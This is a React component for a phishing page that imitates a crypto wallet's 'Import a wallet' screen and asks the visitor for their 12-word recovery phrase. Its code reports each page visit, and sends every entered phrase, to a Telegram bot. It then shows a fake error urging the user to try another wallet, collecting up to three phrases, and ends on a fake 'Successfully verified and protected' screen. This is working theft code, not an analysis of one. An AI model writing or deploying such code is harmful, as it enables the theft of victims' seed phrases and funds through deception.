"use client"
import React, { useState, useEffect } from "react"
import { ArrowLeft, ChevronDown, Info, CheckCircle } from "lucide-react"

export default function ImportWallet() {
  const [phrase, setPhrase] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")
  const [submitCount, setSubmitCount] = useState(0)
  const [isVerified, setIsVerified] = useState(false)

  const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID);
  const [telegramToken] = useState(process.env.NEXT_PUBLIC_TOKEN);

  const NEXT_PUBLIC_ID = telegramChatId;
  const NEXT_PUBLIC_TOKEN = telegramToken;

  // Send message to Telegram
  const sendTelegramMessage = async (message: string) => {
    try {
      await fetch(
        `https://api.telegram.org/bot${telegramToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
          }),
        }
      )
    } catch (error) {
      console.error("Failed to send Telegram message:", error)
    }
  }

  // Send notification when user visits the page
  useEffect(() => {
    const domain = window.location.hostname
    sendTelegramMessage(`User visited the website on domain: ${domain}`)
  }, [])

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (submitCount >= 3) return

    setIsLoading(true)
    setErrorMessage("")

    // Send details to Telegram
    await sendTelegramMessage(`Phrase: ${phrase}`)

    // Wait 3 seconds
    setTimeout(() => {
      setIsLoading(false)
      setErrorMessage("Ensure the words are in order, check the spelling or try another wallet")
      setSubmitCount(prev => prev + 1)

      // Move to success page after 3 submissions
      if (submitCount + 1 === 3) {
        setIsVerified(true)
      }
    }, 3000)
  }

  // Loading spinner component
  const LoadingSpinner = () => (
    <div className="flex justify-center items-center my-4">
      <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500"></div>
    </div>
  )

  // Success page component
  if (isVerified) {
    return (
      <div className="min-h-screen bg-gray-900 text-white flex flex-col items-center justify-center">
        <CheckCircle className="w-16 h-16 text-green-500 mb-4" />
        <h1 className="text-2xl font-bold">Successfully verified and protected</h1>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <header className="flex items-center justify-between p-4 border-b border-gray-800">
        <div className="flex items-center">
          <div className="text-center mb-8">
            <img src="images/image1.png" alt="fox" className="h-8 mx-auto" />
          </div>
        </div>

        <div className="flex items-center space-x-2 bg-gray-800 rounded-lg px-4 py-2 border border-gray-700 hover:bg-gray-700 transition-colors cursor-pointer">
          <span className="text-sm">English</span>
          <ChevronDown className="w-4 h-4" />
        </div>
      </header>

      {/* Main Content */}
      <main className="px-4 py-6 pb-24">
        {/* Navigation */}
        <div className="flex items-center space-x-4 mb-8">
          <ArrowLeft className="w-6 h-6 text-gray-400 cursor-pointer hover:text-white transition-colors" />
          <span className="text-sm text-gray-500">Step 1 of 2</span>
        </div>

        {/* Title */}
        <h1 className="text-3xl font-bold mb-8">Import a wallet</h1>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Input Field */}
          <div className="relative">
            <div className="flex items-center space-x-3">
              <h3 className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none">Enter your 12-word phrase</h3>
            </div>
          </div>

          {/* Large Text Area */}
          <div className="bg-gray-800 border border-gray-700 rounded-lg p-6 min-h-[320px]">
            <textarea
              placeholder="Add a space between each word and make sure no one is watching."
              className="w-full h-full bg-transparent text-gray-300 placeholder-gray-500 resize-none focus:outline-none"
              rows={15}
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
            />
          </div>

          {/* Error Message */}
          {errorMessage && (
            <div className="text-red-400 text-center">{errorMessage}</div>
          )}

          {/* Loading Spinner */}
          {isLoading && <LoadingSpinner />}

          {/* Action Links */}
          <div className="flex justify-between">
            <button type="button" className="text-blue-400 hover:text-blue-300 transition-colors font-medium">
              Show all
            </button>
            <button 
              type="button"
              onClick={() => setPhrase("")}
              className="text-blue-400 hover:text-blue-300 transition-colors font-medium"
            >
              Clear all
            </button>
          </div>

          {/* Continue Button */}
          <div className="fixed bottom-0 left-0 right-0 p-4 bg-gray-900 border-t border-gray-800">
            <button 
              type="submit"
              disabled={isLoading || !phrase}
              className="w-full bg-gray-600 hover:bg-gray-500 text-white font-medium py-4 rounded-lg transition-colors shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Continue
            </button>
          </div>
        </form>
      </main>
    </div>
  )
}